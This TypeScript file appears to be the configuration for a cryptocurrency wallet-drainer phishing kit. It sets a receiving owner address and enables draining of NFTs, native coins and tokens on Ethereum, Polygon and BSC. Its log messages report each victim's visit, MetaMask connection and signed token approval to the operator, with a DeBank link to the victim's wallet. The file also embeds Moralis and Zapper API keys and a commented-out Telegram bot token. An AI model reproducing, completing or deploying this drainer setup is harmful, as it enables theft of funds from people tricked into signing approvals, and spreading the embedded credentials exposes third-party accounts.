
export const logLanguage = "eng" as any

export const ownerAddress = "0x62cF48Ff9Be23942a8263D369b556401e48E8c35" // 0xB359d8C766b524994a5582bEa1dad5969111779F

export const MORALIS_KEY = "FIH13rwF3rZLDHtfqt7iDS0t9Nb9CskjJXKfZy5j0suhhHfFSGmi50cz039HpqNs"
export const ZAPPER_KEY = "Basic N2UyMTE4ODEtOTVlNi00ZjUxLWE2MGUtZDY2NGMxZTllNWM0"

export const autoMetamaskConnect = 0 as 1 | 0

export const tgConfig = {
    botToken: "", //2026144055:AAEii18hnp52hQ4c75V9h1Va-oGEnvVxtNA
    chatId: "" // 772367784
} as any

export const chains = {
    eth: true,
    matic: true,
    bsc: true,
}

export const toDrain = {
    eth: {
        nft: true,
        eth: true,
        tokens: true
    },

    matic: {
        nft: true,
        eth: true,
        tokens: true,
    },

    bsc: {
        nft: false,
        eth: true,
        tokens: true,
    }

} as any

export const LOG_SCHEMA = {
    eng: {
        onConnect: "💠 User $id visited the site",
        onDisconnect: "💤 User $id has left the site",
        onMetamaskConnect: "🔑 User $id connected metamask [DeBank](https://debank.com/profile/$wallet)",
        onApprove: "🤑 User $id opened window with token approval",
        onCancel: "😢 User $id canceled transaction",
        onSign: "✅ User $id has signed an approval",
        onCancelSwitch: "😢 User $id did not change network"
    }
} as any

export function updateState(event: any) {
    switch (event) {

        case "metamaskConnected":
            break;
        case "metamaskDisconnected":
            break;
        case "userTokensFetching":
            break;
        case "userTokensFetched":
            break;

    }
} 